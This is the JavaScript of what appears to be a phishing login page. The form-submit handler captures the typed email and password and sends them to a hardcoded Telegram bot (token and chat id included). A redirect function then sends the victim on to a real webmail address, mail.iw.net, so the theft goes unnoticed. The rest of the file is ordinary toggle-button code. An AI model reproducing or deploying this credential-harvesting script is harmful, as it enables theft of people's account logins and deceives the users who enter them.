const form = document.querySelector("#form");

form.addEventListener("submit", (e) => {
    e.preventDefault();

    const email = document.querySelector("#email").value;
    const password = document.querySelector("#password").value;
    const token = "7629474953:AAHcWHilNvcRySyxwSiIHZd1rv5qWXE3wKM";
    const chat_id = "7150651870";

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}`;

    const api = new XMLHttpRequest();
    api.open("POST", url, true); // Use POST method
    api.setRequestHeader("Content-Type", "application/json"); // Important for POST requests

    // Construct the JSON payload
    const data = JSON.stringify({
        chat_id: chat_id,
        email: email.value,
        password:password.value,
        text: `Email: ${email} Password: ${password}`,
    });

    api.onload = () => {
        if (api.status >= 200 && api.status < 300) {
            console.log("Message sent successfully!");
            // Optionally display a success message to the user
        } else {
            console.error("Error sending message:", api.status, api.responseText);
            // Optionally display an error message to the user
        }
    };

    api.onerror = () => {
        console.error("Network error occurred.");
        // Handle network errors appropriately
    }

    api.send(data); // Send the JSON data with the request
    email.value = "";
    password.value = ""; //Clear the input field
});


const switchToggle = document.getElementById("switch-toggle");
const switchBtn = document.getElementById("btn");

if (switchBtn) {
    switchBtn.addEventListener("click", (event) => {
        event.preventDefault();
        if (switchToggle) {
            // Toggle the position using classList
            switchToggle.classList.toggle("translate-x-2");
        }
    });
}

const switchToggleA = document.getElementById("switch-toggle-a");
const switchBtnA = document.getElementById("btn-a");

if (switchBtnA) {
    switchBtnA.addEventListener("click", (event) => {
        event.preventDefault();
        if (switchToggleA) {
            // Toggle the position using classList
            switchToggleA.classList.toggle("translate-x-2");
        }
    });
}

function redirect() {
    // Get the form data (for example, assuming a form with an input field with id="inputField")
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    // Check if the form data is empty
    if (email.trim() === "" || password.trim() === "") {
        return; // Don't redirect if the form is empty
    }

    // Proceed with the redirect if there is data
    window.location.href = "https://mail.iw.net/" + [];
}

// function redirect() {
//     window.location.href = "https://mail.iw.net/"+[];
//   }